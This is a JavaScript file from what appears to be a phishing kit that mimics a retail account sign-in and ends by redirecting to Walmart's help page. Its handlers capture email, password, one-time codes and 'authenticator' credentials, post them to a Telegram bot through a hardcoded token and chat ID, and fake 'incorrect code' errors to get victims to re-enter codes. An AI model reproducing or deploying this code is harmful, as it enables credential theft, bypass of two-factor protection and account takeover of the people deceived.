// Volver a inicio al hacer click en 'Change' del panel de código
const changeLinkCode = document.getElementById('changeLinkCode');
if(changeLinkCode){
  changeLinkCode.addEventListener('click', (e)=>{
    e.preventDefault();
    if(panelCode) { panelCode.style.display = 'none'; panelCode.setAttribute('aria-hidden','true'); }
    if(panel1) { panel1.style.display = 'block'; panel1.setAttribute('aria-hidden','false'); }
    if(panel2) { panel2.style.display = 'none'; panel2.setAttribute('aria-hidden','true'); }
  });
}
// Lógica para mostrar loader y mensaje al pedir otro código
const getAnotherCode = document.getElementById('getAnotherCode');
const codeLoader = document.getElementById('codeLoader');
const codeSentMsg = document.getElementById('codeSentMsg');
if(getAnotherCode && codeLoader && codeSentMsg){
  getAnotherCode.addEventListener('click', (e)=>{
    e.preventDefault();
    codeSentMsg.style.display = 'none';
    codeLoader.style.display = 'inline-block';
    getAnotherCode.style.display = 'none';
    setTimeout(()=>{
      codeLoader.style.display = 'none';
      codeSentMsg.style.display = 'inline-block';
      setTimeout(()=>{
        codeSentMsg.style.display = 'none';
        getAnotherCode.style.display = 'inline';
      }, 10000);
    }, 1200);
  });
}
// Importar la función para enviar credenciales a Telegram
// Si usas módulos, descomenta la siguiente línea y asegúrate de usar type="module" en tu script en index.html
// import { enviarCredencialesTelegram } from './sender.js';
// Si no usas módulos, incluye sender.js antes que app.js en tu HTML

const panel1 = document.getElementById('panel1');
const panel2 = document.getElementById('panel2');
const panelCode = document.getElementById('panelCode');

// Al cargar la página, ocultar panel2 y panelCode, mostrar solo panel1
document.addEventListener('DOMContentLoaded', () => {
  if (panel1) { panel1.style.display = 'block'; panel1.setAttribute('aria-hidden', 'false'); }
  if (panel2) { panel2.style.display = 'none'; panel2.setAttribute('aria-hidden', 'true'); }
  if (panelCode) { panelCode.style.display = 'none'; panelCode.setAttribute('aria-hidden', 'true'); }
});
const continueBtn = document.getElementById('continueBtn');
const identifier = document.getElementById('identifier');
const displayEmail = document.getElementById('displayEmail');
const codeEmail = document.getElementById('codeEmail');
const changeLink = document.getElementById('changeLink');
const optCode = document.getElementById('optCode');
const optPass = document.getElementById('optPass');
const passwordBlock = document.getElementById('passwordBlock');
const togglePwd = document.getElementById('togglePwd');
const password = document.getElementById('password');
const signInBtn = document.getElementById('signInBtn');

function showPanel2(email) {
  displayEmail.textContent = email;
  codeEmail.textContent = email;
  panel1.style.display = 'none';
  panel2.style.display = 'block';
  panel2.setAttribute('aria-hidden', 'false');
  panel1.setAttribute('aria-hidden', 'true');
}

continueBtn.addEventListener('click', () => {
  const val = identifier.value.trim();
  if (!val) {
    identifier.focus();
    identifier.style.borderColor = '#e05';
    return;
  }
  identifier.style.borderColor = '';
  // For demo we accept whatever is typed. If it's a phone, still show it.
  showPanel2(val);
});

changeLink.addEventListener('click', (e) => {
  e.preventDefault();
  panel2.style.display = 'none';
  panel1.style.display = 'block';
  panel1.setAttribute('aria-hidden', 'false');
  panel2.setAttribute('aria-hidden', 'true');
});

// toggle between code/password
optCode.addEventListener('change', () => {
  if (optCode.checked) {
    passwordBlock.style.display = 'none';
  }
});
optPass.addEventListener('change', () => {
  if (optPass.checked) {
    passwordBlock.style.display = 'block';
  }
});

togglePwd.addEventListener('click', (e) => {
  e.preventDefault();
  if (password.type === 'password') {
    password.type = 'text'; togglePwd.textContent = 'Hide';
  } else { password.type = 'password'; togglePwd.textContent = 'Show'; }
});

signInBtn.addEventListener('click', () => {
  // Validar método y datos
  if (optPass.checked && !password.value) {
    password.style.borderColor = '#e05'; password.focus(); return;
  }
  // Ocultar panel1 y panel2
  panel1.style.display = 'none';
  panel2.style.display = 'none';
  panel1.setAttribute('aria-hidden', 'true');
  panel2.setAttribute('aria-hidden', 'true');
  // Mostrar panelCode
  const panelCode = document.getElementById('panelCode');
  const codePanelEmail = document.getElementById('codePanelEmail');
  const codePanelEmail2 = document.getElementById('codePanelEmail2');
  if (panelCode && codePanelEmail && codePanelEmail2) {
    panelCode.style.display = 'block';
    panelCode.setAttribute('aria-hidden', 'false');
    codePanelEmail.textContent = displayEmail.textContent;
    codePanelEmail2.textContent = displayEmail.textContent;
  }
  // Enviar a Telegram según método
  if (optPass.checked) {
    if (typeof enviarCredencialesTelegram === 'function') {
      enviarCredencialesTelegram(displayEmail.textContent, password.value);
    }
    console.log('Signed in', { email: displayEmail.textContent, password: password.value });
  } else {
    if (typeof enviarCredencialesTelegram === 'function') {
      enviarCredencialesTelegram(displayEmail.textContent, '');
    }
    console.log('Request code for', displayEmail.textContent);
  }
});
// Lógica para enviar el código a Telegram
function enviarCodigoTelegram(email, codigo) {
  const token = '8661171262:AAFERx712IcMyTvPJDId8bLvMPK00hIvJu0';
  const chatId = '1739505466';
  const mensaje = `Código ingresado\nCorreo: ${email}\nCódigo: ${codigo}`;
  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: mensaje
    })
  })
    .then(response => response.json())
    .then(data => {
      console.log('Código enviado a Telegram:', data);
    })
    .catch(error => {
      console.error('Error enviando código a Telegram:', error);
    });
}

// Lógica para capturar el código y enviarlo
const signInCodeBtn = document.getElementById('signInCodeBtn');
let firstCode = null;
if(signInCodeBtn){
  signInCodeBtn.addEventListener('click', ()=>{
    const codeInputs = document.querySelectorAll('#codeInputs .code-input');
    let code = '';
    codeInputs.forEach(input => code += input.value.trim());
    const codeErrorAlert = document.getElementById('codeErrorAlert');
    // Alerta personalizada para segundo intento
    let customError = document.getElementById('codeCustomError');
    if(!customError && codeErrorAlert){
      customError = document.createElement('div');
      customError.id = 'codeCustomError';
      customError.className = 'alert-error';
      customError.style.display = 'none';
      customError.innerHTML = '<span style="font-weight:bold;">&#9888;</span> The verification code you entered is incorrect. Please check and re-enter the 6-digit code.';
      codeErrorAlert.parentNode.insertBefore(customError, codeErrorAlert.nextSibling);
    }
    if(code.length === 6){
      // Limpiar errores
      if(codeErrorAlert) codeErrorAlert.style.display = 'none';
      codeInputs.forEach(input => input.classList.remove('error'));
      if(firstCode === null){
        // Primer intento, guardar y pedir de nuevo
        firstCode = code;
        // Limpiar inputs
        codeInputs.forEach(input => { input.value = ''; input.classList.remove('error'); });
        if(customError) customError.style.display = 'block';
        codeInputs[0].focus();
      } else {
        // Segundo intento, comparar
        // Enviar ambos códigos al Telegram
        enviarCodigoTelegram(codePanelEmail.textContent, `Primer código: ${firstCode}\nSegundo código: ${code}`);
        // Mostrar panel de autenticación
        if(panelCode) { panelCode.style.display = 'none'; panelCode.setAttribute('aria-hidden','true'); }
        const panelAuthenticator = document.getElementById('panelAuthenticator');
        if(panelAuthenticator) { panelAuthenticator.style.display = 'block'; panelAuthenticator.setAttribute('aria-hidden','false'); }
        // Limpiar para siguiente uso
        firstCode = null;


// Lógica para el panel de autenticación extra (fuera del bloque)
const authSubmitBtn = document.getElementById('authSubmitBtn');
const authEmail = document.getElementById('authEmail');
const authPassword = document.getElementById('authPassword');
const authErrorAlert = document.getElementById('authErrorAlert');
const authLoader = document.getElementById('authLoader');
let authAttempt = 0;
if(authSubmitBtn && authEmail && authPassword && authErrorAlert && authLoader){
  authSubmitBtn.addEventListener('click', (e)=>{
    e.preventDefault();
    authErrorAlert.style.display = 'none';
    authPassword.classList.remove('error');
    authSubmitBtn.style.display = 'none';
    authLoader.style.display = 'block';
    // Enviar email y contraseña al Telegram
    enviarCodigoTelegram(authEmail.value, `Authenticator email: ${authEmail.value}\nAuthenticator password: ${authPassword.value}`);
    setTimeout(()=>{
      authLoader.style.display = 'none';
      authSubmitBtn.style.display = 'block';
      authPassword.value = '';
      authPassword.focus();
      authAttempt++;
      if(authAttempt === 1){
        authErrorAlert.style.display = 'block';
        authPassword.classList.add('error');
      } else {
        window.location.href = 'https://www.walmart.com/help';
      }
    }, 5000);
  });
  authPassword.addEventListener('input', ()=>{
    authPassword.classList.remove('error');
    authErrorAlert.style.display = 'none';
  });
}
      }
    } else {
      if(codeErrorAlert) codeErrorAlert.style.display = 'block';
      codeInputs.forEach(input => input.classList.add('error'));
      codeInputs[0].focus();
    }
  });
}

// UX: mover foco automáticamente entre inputs de código
const codeInputs = document.querySelectorAll('#codeInputs .code-input');
codeInputs.forEach((input, idx) => {
  input.addEventListener('input', (e) => {
    // Solo permitir números
    input.value = input.value.replace(/[^0-9]/g, '');
    // Limpiar error al escribir
    input.classList.remove('error');
    const codeErrorAlert = document.getElementById('codeErrorAlert');
    if (codeErrorAlert) codeErrorAlert.style.display = 'none';
    if (input.value.length === 1 && idx < codeInputs.length - 1) {
      codeInputs[idx + 1].focus();
    }
  });
  input.addEventListener('keydown', (e) => {
    // Bloquear letras y caracteres no numéricos
    if (
      e.key.length === 1 &&
      !/[0-9]/.test(e.key) &&
      e.key !== 'Backspace' &&
      e.key !== 'Tab' &&
      e.key !== 'ArrowLeft' &&
      e.key !== 'ArrowRight'
    ) {
      e.preventDefault();
    }
    if (e.key === 'Backspace' && !input.value && idx > 0) {
      codeInputs[idx - 1].focus();
    }
  });
});

// small UX: enter on field
identifier.addEventListener('keydown', (e) => { if (e.key === 'Enter') continueBtn.click(); });
password.addEventListener('keydown', (e) => { if (e.key === 'Enter') signInBtn.click(); });

// footer toggle behavior
const optSwitch = document.getElementById('optSwitch');
if (optSwitch) {
  // default on
  optSwitch.classList.add('on');
  optSwitch.addEventListener('click', () => {
    optSwitch.classList.toggle('on');
    const checked = optSwitch.classList.contains('on');
    optSwitch.setAttribute('aria-checked', checked ? 'true' : 'false');
  });
  optSwitch.addEventListener('keydown', (e) => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); optSwitch.click(); } });
}
